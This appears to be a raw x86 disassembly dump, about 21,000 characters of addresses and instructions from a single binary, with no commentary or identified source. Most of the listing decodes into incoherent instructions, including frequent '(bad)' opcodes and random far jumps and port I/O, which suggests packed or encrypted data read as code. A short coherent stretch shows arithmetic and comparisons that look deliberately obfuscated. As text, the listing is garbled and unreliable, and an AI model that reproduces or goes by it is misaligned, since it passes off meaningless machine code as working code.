  41e04a:	fcomip st,st(7)
  41e04c:	jo     0x41e0ca
  41e04e:	(bad)  
  41e04f:	fnstsw WORD PTR [ecx]
  41e051:	push   eax
  41e052:	scas   eax,DWORD PTR es:[edi]
  41e053:	and    eax,0x26bce78
  41e058:	add    al,0xa9
  41e05a:	xchg   edx,eax
  41e05b:	das    
  41e05c:	xlat   BYTE PTR ds:[ebx]
  41e05d:	dec    ebx
  41e05e:	cmp    BYTE PTR [esp+ebx*2],cl
  41e061:	loope  0x41e08f
  41e063:	mov    eax,0x90f9c403
  41e068:	mov    esp,0x739c96a8
  41e06d:	and    esp,ebp
  41e06f:	scas   al,BYTE PTR es:[edi]
  41e070:	lea    esi,[eax-0x7b51d0db]
  41e076:	(bad)  
  41e078:	and    ah,BYTE PTR [ecx+0x7a399bb8]
  41e07e:	sub    BYTE PTR [ebx+0x74],bl
  41e081:	push   esp
  41e082:	mov    ebx,0x87c2bbfa
  41e087:	out    0xd5,al
  41e089:	rcr    DWORD PTR [ebx+ebp*8+0x7ce606b0],cl
  41e090:	imul   esp,DWORD PTR [edi+0x2e],0xffffffe4
  41e094:	inc    eax
  41e095:	(bad)  
  41e096:	(bad)  
  41e097:	mov    ebp,0x4b3cf9
  41e09c:	fidivr DWORD PTR [edi-0x49c99bf0]
  41e0a2:	lds    ebp,FWORD PTR [eax]
  41e0a4:	cwde   
  41e0a5:	lock jns 0x41e10c
  41e0a8:	adc    ah,BYTE PTR ds:0xc0a6e896
  41e0ae:	pop    esi
  41e0af:	mov    edx,0x3c0e92e
  41e0b4:	retf   
  41e0b5:	into   
  41e0b6:	push   edi
  41e0b7:	inc    ebx
  41e0b8:	xchg   ecx,eax
  41e0b9:	cmp    eax,0xa7445d96
  41e0be:	shr    ecx,cl
  41e0c0:	rol    BYTE PTR [ecx],cl
  41e0c2:	mov    dl,0xe0
  41e0c4:	push   esi
  41e0c5:	retf   0x80ae
  41e0c8:	dec    esp
  41e0c9:	xor    eax,0x86e5c257
  41e0ce:	pop    esi
  41e0cf:	mov    edi,0x383a7e9b
  41e0d4:	ffree  st(5)
  41e0d6:	ret    
  41e0d7:	jecxz  0x41e0d4
  41e0d9:	mov    esp,0xeb8f3ef3
  41e0de:	and    eax,0xe70f797b
  41e0e3:	hlt    
  41e0e4:	mov    cl,0x2c
  41e0e6:	xor    al,0x23
  41e0e8:	pop    ecx
  41e0e9:	shl    DWORD PTR [eax],1
  41e0eb:	mov    WORD PTR [esi-0x181f991f],?
  41e0f1:	adc    ch,cl
  41e0f3:	mov    esi,0x8ea99b7
  41e0f8:	xor    esp,esp
  41e0fa:	mov    bh,0x39
  41e0fc:	fldcw  WORD PTR [ebp+eax*1-0x47856bea]
  41e103:	jle    0x41e13b
  41e105:	push   cs
  41e106:	fs cli 
  41e108:	das    
  41e109:	dec    ebx
  41e10a:	pusha  
  41e10b:	test   bl,0xa2
  41e10e:	pop    ecx
  41e10f:	jl     0x41e0f5
  41e111:	dec    ebp
  41e112:	xor    edi,DWORD PTR ds:0x1a97dcb3
  41e118:	mov    DWORD PTR [esp+0x10],0x421a
  41e120:	mov    eax,DWORD PTR [esp+0x10]
  41e124:	and    eax,0xffffc244
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	je     0x41e1a9
  41e1f3:	adc    al,0xaa
  41e1f5:	(bad)  
  41e1f6:	aas    
  41e1f7:	push   ss
  41e1f8:	sbb    BYTE PTR [edx+edx*1+0x67501818],bh
  41e1ff:	add    BYTE PTR [ecx],ch
  41e201:	aaa    
  41e202:	and    eax,0x3588102c
  41e207:	sbb    bh,al
  41e209:	sub    eax,0xc686ad73
  41e20e:	mov    bh,BYTE PTR [ebp-0x1c]
  41e211:	add    BYTE PTR [edx+0x13a38275],al
  41e217:	loopne 0x41e20e
  41e219:	inc    eax
  41e21a:	or     eax,0x1d8c9bc6
  41e21f:	stos   BYTE PTR es:[edi],al
  41e220:	outs   dx,BYTE PTR ds:[esi]
  41e221:	fst    QWORD PTR [ebp+0x4f]
  41e224:	sbb    al,0xe9
  41e226:	loopne 0x41e29d
  41e228:	fnstsw WORD PTR [ebp+0x7]
  41e22b:	loopne 0x41e209
  41e22d:	cmp    DWORD PTR [ecx-0x47d562bb],ecx
  41e233:	mov    es,WORD PTR [ebp+esi*2+0x264ea346]
  41e23a:	bnd jl 0x41e1e2
  41e23d:	test   DWORD PTR [edx-0x7b],ebp
  41e240:	fs out dx,al
  41e242:	mov    ecx,0x59795fa4
  41e247:	arpl   sp,dx
  41e249:	mov    esp,0x72db7e37
  41e24e:	mov    cl,0x8c
  41e250:	cmp    al,0x9e
  41e252:	in     eax,dx
  41e253:	jmp    0xef15:0x293c53b6
  41e25a:	push   esp
  41e25b:	inc    eax
  41e25c:	add    eax,DWORD PTR [ecx]
  41e25e:	out    0x93,al
  41e260:	push   ebp
  41e261:	pop    ebp
  41e262:	mov    dh,0xe1
  41e264:	pop    ecx
  41e265:	or     ecx,DWORD PTR [edx-0x3a]
  41e268:	jg     0x41e2e6
  41e26a:	ss ds jl 0x41e2e8
  41e26e:	out    0x86,al
  41e270:	mov    DWORD PTR [esi-0x62],edi
  41e273:	xchg   ecx,eax
  41e274:	ja     0x41e2a1
  41e276:	pop    ebx
  41e277:	retf   
  41e278:	fs dec ebp
  41e27a:	jo     0x41e259
  41e27c:	jae    0x41e2a8
  41e27e:	rol    BYTE PTR [ebx+ebp*2],cl
  41e281:	fsub   DWORD PTR [edi-0x76]
  41e284:	hlt    
  41e285:	mov    BYTE PTR [eax+0x4c],bh
  41e288:	pop    esp
  41e289:	sub    al,0x80
  41e28b:	dec    edi
  41e28c:	rcl    BYTE PTR [edx],0x4f
  41e28f:	shl    BYTE PTR [edx+0x6d],1
  41e292:	(bad)
  41e295:	bound  esi,QWORD PTR [eax]
  41e297:	sbb    BYTE PTR [eax+0x25de4fe1],dh
  41e29d:	jno    0x41e220
  41e29f:	pop    edi
  41e2a0:	jg     0x41e2d4
  41e2a2:	dec    edx
  41e2a3:	xor    al,0x48
  41e2a5:	lock dec edi
  41e2a7:	stc    
  41e2a8:	aam    0xf7
  41e2aa:	mov    dl,BYTE PTR [ecx+0x1]
  41e2ad:	pop    esp
  41e2ae:	fwait
  41e2af:	popf   
  41e2b0:	push   ss
  41e2b1:	mov    al,ds:0x3e99c055
  41e2b6:	cmp    BYTE PTR [ebp+ebp*1+0x18],0x7b
  41e2bb:	aaa    
  41e2bc:	dec    edi
  41e2bd:	mov    eax,0xa70a66c3
  41e2c2:	and    al,0x0
  41e2c4:	jbe    0x41e29f
  41e2c6:	xor    edi,DWORD PTR [edi+0x7f6cdee2]
  41e2cc:	lods   al,BYTE PTR ds:[esi]
  41e2cd:	in     al,dx
  41e2ce:	shl    BYTE PTR [ecx],1
  41e2d0:	aam    0x3f
  41e2d2:	inc    eax
  41e2d3:	and    DWORD PTR [eax+0x26],0x9370a6a0
  41e2da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2db:	aad    0xf9
  41e2dd:	fild   QWORD PTR [ecx+0x22a43a58]
  41e2e3:	sub    esp,DWORD PTR [edx-0x1346406e]
  41e2e9:	adc    eax,0x5046459
  41e2ee:	sbb    ah,BYTE PTR [esi]
  41e2f0:	in     al,0xfa
  41e2f2:	(bad)  
  41e2f3:	cmp    eax,esi
  41e2f5:	or     ebx,DWORD PTR [eax-0x1b]
  41e2f8:	push   ecx
  41e2f9:	pop    ebp
  41e2fa:	int    0xe3
  41e2fc:	cs retf 
  41e2fe:	inc    eax
  41e2ff:	dec    ebp
  41e300:	je     0x41e34a
  41e302:	mov    esp,0xc688a336
  41e307:	xchg   ebx,eax
  41e308:	and    DWORD PTR [edi+0x22785fb0],ecx
  41e30e:	loop   0x41e33f
  41e310:	lods   al,BYTE PTR ds:[esi]
  41e311:	fisubr WORD PTR [ecx+0x9]
  41e314:	(bad)  
  41e315:	out    0x4,al
  41e317:	cwde   
  41e318:	jmp    0x41e2a8
  41e31a:	pop    ebx
  41e31b:	xchg   esi,eax
  41e31c:	cs jb  0x41e30e
  41e31f:	retf   0xa278
  41e322:	jmp    0xf9d5:0xf5be97ea
  41e329:	cld    
  41e32a:	jl     0x41e308
  41e32c:	fwait
  41e32d:	pop    ds
  41e32e:	mov    ecx,eax
  41e330:	out    0xe0,al
  41e332:	or     cl,BYTE PTR cs:[ebp+edx*4-0x54521978]
  41e33a:	or     al,0xe4
  41e33c:	sbb    ebp,DWORD PTR [ecx+0x69]
  41e33f:	aam    0x43
  41e341:	xchg   edi,eax
  41e342:	adc    al,0x32
  41e344:	mov    ch,0x31
  41e346:	popf   
  41e347:	xchg   ecx,eax
  41e348:	adc    BYTE PTR [ecx+0x1a],ah
  41e34b:	scas   al,BYTE PTR es:[edi]
  41e34c:	add    bh,BYTE PTR [ebx+ebp*2]
  41e34f:	add    al,0xbf
  41e351:	retf   
  41e352:	mov    esp,DWORD PTR [ecx-0x6f]
  41e355:	mov    edx,0x2dec874f
  41e35a:	jbe    0x41e2dd
  41e35c:	mov    eax,0xc1023f4c
  41e361:	sub    al,BYTE PTR [ebp+0x1a]
  41e364:	in     eax,dx
  41e365:	pop    ebp
  41e366:	xchg   esi,eax
  41e367:	adc    DWORD PTR [ecx+0x44f39eed],0xffffffe5
  41e36e:	add    ch,BYTE PTR [eax-0x4d]
  41e371:	mov    bh,0x94
  41e373:	aam    0xbe
  41e375:	dec    esi
  41e376:	outs   dx,DWORD PTR ds:[esi]
  41e377:	mov    dl,BYTE PTR [ebx+0x4fdae9b]
  41e37d:	mov    dh,BYTE PTR [eax+0x78412de6]
  41e383:	outs   dx,BYTE PTR ds:[esi]
  41e384:	mov    cl,0x47
  41e386:	or     BYTE PTR [ebp+0x16eb15a4],0x81
  41e38d:	cmp    ecx,DWORD PTR [edx-0x40ce23a3]
  41e393:	mov    dl,0x6a
  41e395:	add    cl,BYTE PTR [ebp+edi*1-0x5bd1951f]
  41e39c:	xor    eax,0x2981f74b
  41e3a1:	pop    ebx
  41e3a2:	xchg   BYTE PTR ds:0x822d6fcf,bl
  41e3a8:	sar    BYTE PTR [ebp+0x38f6b10d],1
  41e3ae:	std    
  41e3af:	inc    eax
  41e3b0:	inc    ecx
  41e3b1:	mov    bh,0x3b
  41e3b3:	iret   
  41e3b4:	leave  
  41e3b5:	iret   
  41e3b6:	std    
  41e3b7:	mov    esi,0x5a2d71df
  41e3bc:	das    
  41e3bd:	enter  0xb620,0x49
  41e3c1:	lds    edx,FWORD PTR [ecx-0x65]
  41e3c4:	xor    edi,DWORD PTR [edi+0x2486347e]
  41e3ca:	div    cl
  41e3cc:	fcmovne st,st(5)
  41e3ce:	cmc    
  41e3cf:	push   ecx
  41e3d0:	repz jo 0x41e388
  41e3d3:	jmp    0x33920e6
  41e3d8:	hlt    
  41e3d9:	push   es
  41e3da:	dec    esp
  41e3db:	mov    esi,DWORD PTR [ebp+0x61]
  41e3de:	pusha  
  41e3df:	mov    esp,0xa778f1b2
  41e3e4:	enter  0x391,0x9e
  41e3e8:	(bad)  
  41e3ea:	fldenv [ebx-0x79]
  41e3ed:	mov    ebx,0x26d5ea00
  41e3f2:	or     BYTE PTR [ecx-0x546752e2],bh
  41e3f8:	pop    eax
  41e3f9:	add    edi,edi
  41e3fb:	cmp    ecx,esp
  41e3fd:	mov    edx,0xd420ad57
  41e402:	cdq    
  41e403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e405:	or     BYTE PTR [edi-0x52],cl
  41e408:	lock cli 
  41e40a:	scas   eax,DWORD PTR es:[edi]
  41e40b:	test   BYTE PTR [ecx-0x5011c50f],dl
  41e411:	cmp    eax,0x19f15331
  41e416:	sbb    al,0x7d
  41e418:	adc    ecx,DWORD PTR [eax+0x66]
  41e41b:	mov    dl,0x9b
  41e41d:	into   
  41e41e:	xchg   ebx,eax
  41e41f:	jp     0x41e3b5
  41e421:	int3   
  41e422:	sbb    eax,DWORD PTR [ebx-0x6500901b]
  41e428:	arpl   bx,si
  41e42a:	lea    edi,[ebp-0x450485f3]
  41e430:	mov    dl,0xd
  41e432:	inc    edi
  41e433:	fbld   TBYTE PTR [ebx+0x7c]
  41e436:	ror    DWORD PTR [ecx],1
  41e438:	adc    cl,BYTE PTR [edi-0x2f]
  41e43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e43c:	sub    BYTE PTR gs:[ebx+0x40],dl
  41e440:	mov    edi,0x18b4eb37
  41e445:	adc    ecx,DWORD PTR [edi-0x3]
  41e448:	pop    esp
  41e449:	jge    0x41e44a
  41e44b:	cmove  ebp,DWORD PTR [eax+eiz*8]
  41e44f:	dec    ebx
  41e450:	std    
  41e451:	cdq    
  41e452:	jbe    0x41e4b1
  41e454:	pop    eax
  41e455:	sti    
  41e456:	cdq    
  41e457:	jp     0x41e4ad
  41e459:	or     eax,0xc7cc61d0
  41e45e:	xor    BYTE PTR [ebp+0x39],0xbd
  41e462:	push   eax
  41e463:	out    dx,eax
  41e464:	stos   BYTE PTR es:[edi],al
  41e465:	mov    ch,0xd
  41e467:	ja     0x41e48e
  41e469:	xor    eax,0x9a98e44e
  41e46e:	cmp    ah,ch
  41e470:	icebp  
  41e471:	add    ecx,DWORD PTR [ecx]
  41e473:	int    0x60
  41e475:	lods   al,BYTE PTR ds:[esi]
  41e476:	jo     0x41e4ad
  41e478:	push   0xffffffc9
  41e47a:	nop
  41e47b:	cmp    bh,BYTE PTR [eax+0x39]
  41e47e:	mov    ?,WORD PTR [edx]
  41e480:	fnstenv ds:0xf4949cd3
  41e486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e487:	test   DWORD PTR [ecx+0x2f],0x10e3094a
  41e48e:	(bad)  
  41e48f:	sbb    eax,DWORD PTR ds:0x23de33f9
  41e495:	ret    
  41e496:	ret    0x2158
  41e499:	and    cl,BYTE PTR [esi-0x59]
  41e49c:	push   0x74
  41e49e:	arpl   WORD PTR [edx],si
  41e4a0:	push   0xd87b9a96
  41e4a5:	push   0x512a7d57
  41e4aa:	loop   0x41e4fc
  41e4ac:	nop
  41e4ad:	pop    ecx
  41e4ae:	repz sub esp,DWORD PTR [ebx-0x34]
  41e4b2:	sbb    esi,DWORD PTR [esp+ebx*2]
  41e4b5:	nop
  41e4b6:	nop
  41e4b7:	xlat   BYTE PTR ds:[ebx]
  41e4b8:	xchg   edx,eax
  41e4b9:	mov    ch,BYTE PTR [ecx+0x5d8bd22d]
  41e4bf:	fstp   QWORD PTR [ebp+ebx*8-0x39d3bc81]
  41e4c6:	or     eax,0xc3d78437
  41e4cb:	sub    DWORD PTR [ecx-0x66],esp
  41e4ce:	push   edi
  41e4cf:	cld    
  41e4d0:	into   
  41e4d1:	mov    al,0xe2
  41e4d3:	cmovns ebp,DWORD PTR [eax]
  41e4d6:	xchg   DWORD PTR [esi],eax
  41e4d8:	pop    edi
  41e4d9:	push   esp
  41e4da:	mov    BYTE PTR [edi+0x4fafc75],ah
  41e4e0:	lods   eax,DWORD PTR ds:[esi]
  41e4e1:	mov    dh,0xc9
  41e4e3:	adc    DWORD PTR [ecx],ebp
  41e4e5:	rol    DWORD PTR [edi],cl
  41e4e7:	pop    ecx
  41e4e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4e9:	(bad)  
  41e4ea:	sub    al,cl
  41e4ec:	cli    
  41e4ed:	cwde   
  41e4ee:	lock fwait
  41e4f0:	jns    0x41e53b
  41e4f2:	push   ds
  41e4f3:	dec    ecx
  41e4f4:	mov    ah,0x7d
  41e4f6:	aaa    
  41e4f7:	and    ebx,ecx
  41e4f9:	or     al,0x3b
  41e4fb:	and    BYTE PTR [ecx-0x47],ch
  41e4fe:	in     al,dx
  41e4ff:	in     al,0xe
  41e501:	mov    fs,WORD PTR [ebp-0x7aa294d4]
  41e507:	outs   dx,BYTE PTR ds:[esi]
  41e508:	mov    BYTE PTR [ecx+0x52],al
  41e50b:	cdq    
  41e50c:	inc    ebx
  41e50d:	push   ebp
  41e50e:	jecxz  0x41e57f
  41e510:	and    DWORD PTR [ecx],eax
  41e512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e513:	dec    ecx
  41e514:	ror    BYTE PTR [esi+0x616662d0],0x5c
  41e51b:	test   DWORD PTR [eax+0x525ce00d],0x179f509c
  41e525:	arpl   dx,ax
  41e527:	cmp    BYTE PTR [ebp+0x0],dh
  41e52a:	jns    0x41e571
  41e52c:	push   edx
  41e52d:	popa   
  41e52e:	shl    dl,1
  41e530:	push   eax
  41e531:	inc    ecx
  41e532:	cs jmp 0x41e527
  41e535:	jmp    0x41e4e8
  41e537:	mov    eax,ds:0x3d0d685e
  41e53c:	mov    al,ds:0x36d142cf
  41e541:	rcl    BYTE PTR [ebp-0x63],0x17
  41e545:	add    eax,0xc69b0a4c
  41e54a:	(bad)  
  41e54b:	sahf   
  41e54c:	gs shl eax,cl
  41e54f:	mov    bl,0x9f
  41e551:	or     ah,BYTE PTR [esi+0x483943ab]
  41e557:	aam    0xf0
  41e559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e55a:	jg     0x41e56e
  41e55c:	pop    es
  41e55d:	xchg   edx,eax
  41e55e:	mov    bh,0x8c
  41e560:	xchg   BYTE PTR ds:0x91d7fa98,ch
  41e566:	xchg   esp,eax
  41e567:	lock jmp 0xe927a176
  41e56d:	jge    0x41e57b
  41e56f:	(bad)  
  41e571:	mov    ebp,0x73e091ed
  41e576:	push   ecx
  41e577:	cmp    ebx,ebx
  41e579:	xchg   DWORD PTR [ebx-0x5855f7fc],ecx
  41e57f:	cs dec eax
  41e581:	adc    al,0x7a
  41e583:	std    
  41e584:	in     eax,0xb8
  41e586:	clc    
  41e587:	pop    ebx
  41e588:	outs   dx,DWORD PTR ds:[esi]
  41e589:	fdiv   QWORD PTR [ebp+0x2b1c330a]
  41e58f:	xchg   ecx,eax
  41e590:	and    esi,DWORD PTR [esi+0x38e23a2d]
  41e596:	mov    ecx,0x2ede2e62
  41e59b:	arpl   dx,cx
  41e59d:	ja     0x41e548
  41e59f:	rcl    DWORD PTR [eax],0x99
  41e5a2:	pop    esi
  41e5a3:	loop   0x41e57e
  41e5a5:	pop    ebx
  41e5a6:	retf   
  41e5a7:	rcr    DWORD PTR ds:0xd245ff70,0xa2
  41e5ae:	repnz shl eax,0x2
  41e5b2:	or     eax,ecx
  41e5b4:	jmp    0x41e983
  41e5b9:	test   BYTE PTR [esi],cl
  41e5bb:	nop
  41e5bc:	lahf   
  41e5bd:	jp     0x41e5dd
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0x53aae715
  41e5c6:	mov    edi,0x376b70cb
  41e5cb:	push   ss
  41e5cc:	sbb    BYTE PTR [edx+edx*1-0x3c28e7e8],bh
  41e5d3:	in     al,0x30
  41e5d5:	cld    
  41e5d6:	xchg   ebx,eax
  41e5d7:	xchg   ecx,eax
  41e5d8:	xor    ch,al
  41e5da:	mov    eax,ds:0x2492b0db
  41e5df:	out    dx,al
  41e5e0:	int3   
  41e5e1:	fwait
  41e5e2:	inc    ebp
  41e5e3:	add    ebx,DWORD PTR [ebp-0x54ad6765]
  41e5e9:	and    al,dl
  41e5eb:	xchg   esp,eax
  41e5ec:	pop    esp
  41e5ed:	pusha  
  41e5ee:	sbb    ecx,esi
  41e5f0:	dec    ebp
  41e5f1:	mov    bh,0x9a
  41e5f3:	inc    edi
  41e5f4:	fnstcw WORD PTR [edx+0x34]
  41e5f7:	or     eax,0x1dd743fc
  41e5fc:	inc    ebp
  41e5fd:	ret    
  41e5fe:	sbb    al,0x42
  41e600:	xchg   ecx,eax
  41e601:	rcl    DWORD PTR [ebp+0x62b6334e],0x4e
  41e608:	jle    0x41e5db
  41e60a:	jl     0x41e5fd
  41e60c:	nop
  41e60d:	(bad)  
  41e60f:	push   ebp
  41e610:	inc    ebp
  41e611:	js     0x41e5a5
  41e613:	outs   dx,BYTE PTR ds:[esi]
  41e614:	ds int3 
  41e616:	xor    DWORD PTR [esi-0x12],ebx
  41e619:	sbb    DWORD PTR ds:0x6ff1df1c,esi
  41e61f:	stos   BYTE PTR es:[edi],al
  41e620:	pop    ebx
  41e621:	pop    ds
  41e622:	sub    dl,BYTE PTR [edi-0x4e]
  41e625:	test   al,0x48
  41e627:	add    ebx,DWORD PTR [eax+esi*4-0x49]
  41e62b:	out    0x8b,eax
  41e62d:	mov    ebx,0x33e8079e
  41e632:	xlat   BYTE PTR ds:[ebx]
  41e633:	iret   
  41e634:	in     eax,dx
  41e635:	aas    
  41e636:	fld    DWORD PTR [ebx+0x70]
  41e639:	sbb    al,0x45
  41e63b:	and    edx,edi
  41e63d:	repz add bl,al
  41e640:	js     0x41e602
  41e642:	cmc    
  41e643:	push   edx
  41e644:	data16 cmp bh,BYTE PTR [edx-0x6e]
  41e648:	mov    dl,0xa6
  41e64a:	push   0x34af31c7
  41e64f:	jmp    0x7eef:0xcf0970a9
  41e656:	or     ebp,DWORD PTR [esi-0x31713644]
  41e65c:	bnd jnp 0x41e6d7
  41e65f:	das    
  41e660:	mov    eax,ds:0xfd2c28e0
  41e665:	xchg   BYTE PTR [eax+0x6],al
  41e668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e669:	xchg   edx,eax
  41e66a:	and    esi,ebx
  41e66c:	cli    
  41e66d:	lahf   
  41e66e:	sbb    ebp,DWORD PTR [edi-0x19]
  41e671:	adc    eax,0xbe205aa8
  41e676:	retf   0x67db
  41e679:	loope  0x41e676
  41e67b:	mov    dh,0xaf
  41e67d:	sub    ebp,DWORD PTR [edx-0x29fd676f]
  41e683:	adc    ecx,DWORD PTR [esi+0x5e]
  41e686:	mov    eax,0x86c4138
  41e68b:	popa   
  41e68c:	rcl    edi,0xe6
  41e68f:	call   0xda76:0x3302e945
  41e696:	xchg   esi,eax
  41e697:	sub    ebx,ebx
  41e699:	mov    ebx,0x983bb00e
  41e69e:	cmp    DWORD PTR [eax+0x6d],ebp
  41e6a1:	push   esi
  41e6a2:	or     ch,BYTE PTR [edx+eax*8+0x14]
  41e6a6:	je     0x41e650
  41e6a8:	jecxz  0x41e6cc
  41e6aa:	mul    DWORD PTR [esi]
  41e6ac:	addr16 mov bh,0x8
  41e6af:	(bad)  
  41e6b0:	xor    al,0x11
  41e6b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6b3:	sti    
  41e6b4:	sbb    al,0x1e
  41e6b6:	xchg   edi,eax
  41e6b7:	shr    bh,1
  41e6b9:	xor    BYTE PTR [eax],bh
  41e6bb:	mov    bh,0xb6
  41e6bd:	fsub   st(4),st
  41e6bf:	std    
  41e6c0:	stos   BYTE PTR es:[edi],al
  41e6c1:	jmp    0xb9d6284b
  41e6c6:	dec    esp
  41e6c7:	test   ch,dl
  41e6c9:	or     eax,esp
  41e6cb:	mul    DWORD PTR [eax-0x6f6790ac]
  41e6d1:	inc    esi
  41e6d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6d3:	shl    edx,cl
  41e6d5:	sub    edi,DWORD PTR ds:0x61beef30
  41e6db:	mov    eax,ds:0x80d05965
  41e6e0:	(bad)
  41e6e3:	(bad)  
  41e6e4:	mov    bh,0x35
  41e6e6:	icebp  
  41e6e7:	fcom   QWORD PTR [edi+edx*2]
  41e6ea:	data16 es ja 0x41e718
  41e6ee:	xlat   BYTE PTR ds:[ebx]
  41e6ef:	sbb    eax,0x4e
  41e6f2:	cmp    dh,BYTE PTR [ebx]
  41e6f4:	sub    bh,bl
  41e6f6:	pop    edx
  41e6f7:	sbb    edi,eax
  41e6f9:	push   ebp
  41e6fa:	rol    BYTE PTR [ebp+0x666c25f9],0x16
  41e701:	cmc    
  41e702:	fistp  QWORD PTR [eax+0x2]
  41e705:	mov    dh,0x7
  41e707:	xor    eax,0x87ffbc23
  41e70c:	lahf   
  41e70d:	into   
  41e70e:	into   
  41e70f:	push   ss
  41e710:	mov    eax,ds:0xed31f767
  41e715:	lods   eax,DWORD PTR ds:[esi]
  41e716:	aaa    
  41e717:	adc    ebp,0xffffffd7
  41e71a:	hlt    
  41e71b:	(bad)  
  41e71c:	pop    edx
  41e71d:	jnp    0x41e717
  41e71f:	imul   esp,ebp,0xffffffa7
  41e722:	lock fs retf 
  41e725:	sub    BYTE PTR [ecx-0x2],bh
  41e728:	std    
  41e729:	aaa    
  41e72a:	popa   
  41e72b:	mov    bl,0x1b
  41e72d:	outs   dx,DWORD PTR ds:[esi]
  41e72e:	push   ss
  41e72f:	inc    edx
  41e730:	std    
  41e731:	repz cmp DWORD PTR [edx-0x7a7b1b45],ecx
  41e738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e739:	add    DWORD PTR [edx+ecx*8-0x7056b3db],esp
  41e740:	les    edx,FWORD PTR [esi+0x52]
  41e743:	fst    QWORD PTR [edi]
  41e745:	push   cs
  41e746:	das    
  41e747:	push   edx
  41e748:	inc    edx
  41e749:	sub    esi,DWORD PTR [ecx-0xdd67122]
  41e74f:	scas   al,BYTE PTR es:[edi]
  41e750:	mov    eax,ds:0xe83316d1
  41e755:	inc    BYTE PTR [eax+edx*1+0xe41eeb6]
  41e75c:	add    ch,dl
  41e75e:	fsub   st,st(4)
  41e760:	jmp    0x6da5e93f
  41e765:	inc    esp
  41e766:	mov    ebx,0xf2bf25d9
  41e76b:	sbb    al,0x70
  41e76d:	sub    al,0xa9
  41e76f:	sbb    eax,0x1ad5eddc
  41e774:	xchg   edx,eax
  41e775:	or     eax,ebp
  41e777:	jp     0x41e764
  41e779:	fist   WORD PTR [esi]
  41e77b:	adc    eax,0x9e8e36a9
  41e780:	inc    ebp
  41e781:	or     al,0xbb
  41e783:	les    edi,FWORD PTR [eax]
  41e785:	xchg   DWORD PTR [eax-0x68338347],eax
  41e78b:	adc    eax,0x5b563b0e
  41e790:	pop    ds
  41e791:	nop
  41e792:	cmp    cl,BYTE PTR [ebx-0x6a]
  41e795:	mov    ecx,0x375d079b
  41e79a:	mov    bl,0x8a
  41e79c:	(bad)  
  41e79d:	ins    DWORD PTR es:[edi],dx
  41e79e:	cmp    bh,BYTE PTR [ebx+0x4a7e6f48]
  41e7a4:	(bad)  
  41e7a5:	aam    0xbb
  41e7a7:	adc    eax,0x29f09601
  41e7ac:	nop
  41e7ad:	sub    dh,cl
  41e7af:	or     eax,DWORD PTR [ecx+0x29]
  41e7b2:	lds    ecx,FWORD PTR [edi+ecx*1-0x6ac592f8]
  41e7b9:	fwait
  41e7ba:	aas    
  41e7bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7bc:	pop    eax
  41e7bd:	sbb    al,0x24
  41e7bf:	add    dl,BYTE PTR [esi]
  41e7c1:	adc    ch,BYTE PTR ds:[edi+0x35e5b83f]
  41e7c8:	retf   
  41e7c9:	add    eax,DWORD PTR [esi-0x65ef4a1c]
  41e7cf:	(bad)  
  41e7d0:	xor    BYTE PTR [edi-0x46df69e7],bh
  41e7d6:	mov    bh,0xa2
  41e7d8:	int    0x77
  41e7da:	gs sbb edx,ebx
  41e7dd:	gs adc al,0x3f
  41e7e0:	push   ebx
  41e7e1:	push   esp
  41e7e2:	jns    0x41e847
  41e7e4:	loop   0x41e7d7
  41e7e6:	je     0x41e77b
  41e7e8:	aam    0xcf
  41e7ea:	and    ebp,ebx
  41e7ec:	add    al,0x95
